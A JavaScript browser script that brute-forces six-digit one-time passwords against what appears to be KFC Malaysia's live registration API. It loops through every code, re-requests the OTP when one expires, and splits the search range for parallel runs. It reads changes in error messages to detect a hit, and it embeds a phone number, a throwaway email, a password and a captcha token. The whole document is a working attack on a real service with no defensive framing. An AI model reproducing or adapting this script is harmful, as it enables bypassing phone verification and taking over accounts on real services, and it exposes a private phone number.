//let number = 0, // With 6 possible digits combination
let repeat = 1;

const zeroPad = (num, places) => String(num).padStart(places, '0')

async function requestOTP(shouldStart, number){
    await fetch('https://kfc.com.my/api/v2/otp/send?1640750987291', {
		  method: "post",
		  headers: {
			'Accept': 'application/json',
			'Content-Type': 'application/json'
		  },
		  //make sure to serialize your JSON body
		  body: JSON.stringify({mobile: "0146316035"})
	}).then(r => r.text()).then(r => {console.log(r);shouldStart && (repeat = 1) && loopBrucceForce(number)})
}

async function getOTP(number){
    await fetch('https://kfc.com.my/api/user/registerWithOtp', {
      method: "post",
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },

      //make sure to serialize your JSON body
      body: JSON.stringify({"firstname":"Marcus","lastname":"Tan","phone":"0146316035","email":"teyoxe9654@saturdata.com","password":"1234qweR;","passwordConfirm":"1234qweR;","newsletter":true,"tnc":true,"captcha":"03AGdBq263OYo1kat2SYnUl-GAB7WFA_LvY_UThaVwjgrNJKoEmwnrtMTVK7TOjotFmd_DBcNPknRoDBuEQG5_fGkwJ1Y-f8TXKB4VJBwqDyoXCAOT4T-Bj05kaeOKz0r8di09ql0NJEgKponXQIZdRMW-XDjf5_ZX2RXii36FJcgCzTNTS5voPwsFWHJPVJYMxrmmC4YFVSou3tkJcP9TsdNLXBx8itMiZZGtIli3NhP7_q9waD1t9tUOSuq_R9cMnkUHFDvkcr0GjZWYpYO84zH-4z1YDvPlLWWJajETk-LP6nClV3k6ekHc-207wVhGUEUZe-x1IGXLJFr9tUL2z8WLHbMi6peeWQ_zgR2c18iqHZBSvRZgEysxSeyZnAO54slkN61vhcoXgvCWh1DTO6HSvx3Ju5SU4Zq3NDVSXvuCMrMozCSUdQBCJPRwO3oUG8rJmMtKv3j-","otpCode":zeroPad(number, 6)})
    })
    .then(response => response.text()).then(r => {
		if(r === '{"error":{"otp":"Your One Time Password (OTP) has expired. Please try again."}}'){
			requestOTP(true, number)
			repeat = 0
			// {"error":{"captcha":"captcha code expired"}} if correct
		}else if(r === '{"error":{"captcha":"captcha code expired"}}'){
			console.log('found ' + number)
            console.log(r)
            repeat = 0
			alert(number)
        }else if(r !== '{"error":{"otp":"Invalid code. Please try again."}}'){
			//console.log('found ' + number)
            console.log(r)
            //repeat = 0
			//alert(number)
        }else {
            number = (++number) % 1000000
        }
    });
	
	return number;
}

async function initBruceForce(division, offset){
	let number = 1000000 / division >> 0;
	
	number *= offset;
	// Start loop
	loopBrucceForce(number);
}

async function loopBrucceForce(number){
    let x = await getOTP(number);
    repeat && loopBrucceForce(x);
}
